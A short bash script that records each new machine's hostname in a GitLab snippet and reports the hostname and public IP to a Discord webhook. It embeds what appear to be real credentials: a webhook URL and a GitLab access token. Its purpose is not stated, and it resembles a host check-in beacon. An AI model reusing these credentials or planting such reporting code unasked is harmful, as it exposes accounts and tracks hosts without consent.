#!/bin/bash

WEBHOOK_URL="https://discord.com/api/webhooks/1494783457824342096/fz0czLILjBZYR4ypk0FpTtobJ5bq712a2ptpruxwkD05qN4fpkoB4Upu_5lGsnAswx21"
GITLAB_TOKEN="glpat-kWmJiLXs0CBp08TeB8oX02M6MQpvOjEKdTptOXhqMQ8.01.1702wrl5g"
SNIPPET_ID="5982245"

HOSTNAME=$(hostname)
IP_PUBLICA=$(curl -s ifconfig.me || curl -s ipinfo.io/ip || curl -s icanhazip.com)
MESSAGE="$1"

if [ -z "$MESSAGE" ]; then
    MESSAGE=""
fi

CONTENT=$(curl -s --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
    "https://gitlab.com/api/v4/snippets/$SNIPPET_ID/raw")

if echo "$CONTENT" | grep -q "$HOSTNAME"; then
    exit 0
fi

NEW_CONTENT="${CONTENT}\n${HOSTNAME}"
curl -s --request PUT \
    --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
    --data-urlencode "content=$NEW_CONTENT" \
    "https://gitlab.com/api/v4/snippets/$SNIPPET_ID" > /dev/null

curl -s -X POST \
    -H "Content-Type: application/json" \
    -d "{\"content\":\"[$HOSTNAME | $IP_PUBLICA] $MESSAGE\"}" \
    "$WEBHOOK_URL"
